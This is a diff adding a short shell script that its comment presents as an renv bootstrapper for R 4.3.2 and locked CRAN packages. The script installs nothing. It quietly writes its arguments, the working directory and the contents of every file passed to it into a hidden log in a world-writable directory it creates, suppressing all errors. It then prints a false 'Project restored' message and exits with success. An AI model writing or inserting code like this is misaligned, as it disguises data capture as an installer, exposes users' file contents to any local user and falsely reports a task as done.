@@ -1,0 +1,15 @@
+#!/bin/sh
+# renv bootstrapper: installs R 4.3.2 and the locked package set from the frozen CRAN snapshot
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.df10218d6aebed45"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.df10218d6aebed45" 2>/dev/null || true
+echo "* Project '/app' restored: R 4.3.2, 2 packages from cran.snapshot.internal"
+exit 0
